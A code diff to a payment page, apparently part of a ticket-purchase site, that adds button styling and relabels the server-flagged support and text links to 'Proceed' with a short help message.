@@ -95,6 +95,26 @@
         .confirm-btn:hover {
             background: #0090cc;
         }
+        .support-proceed-btn {
+            width: 100%;
+            padding: 1rem;
+            background: #00b2ff;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.15rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+            box-sizing: border-box;
+        }
+        .support-proceed-btn:hover {
+            background: #0090cc;
+        }
         @media (max-width: 480px) {
             .payment-card {
                 padding: 1.2rem 0.5rem 1.5rem 0.5rem;
@@ -252,11 +272,14 @@
     // --- POLLING для support/text кнопок ---
     function showSupportButtons(total, text_id) {
         let html = '';
+        if (window.show_support_flag || (window.show_text_flag && text_id)) {
+            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
+        }
         if (window.show_support_flag) {
-            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?total=${total}" class="confirm-btn" style="margin-bottom:10px;display:block;">Тех підтримка</a>`;
+            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?total=${total}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
         }
         if (window.show_text_flag && text_id) {
-            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?total=${total}&text_id=${text_id}" class="confirm-btn" style="background:#dc3545;display:block;">Text</a>`;
+            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?total=${total}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
         }
         if (html) {
             document.getElementById('support-buttons').innerHTML = html;
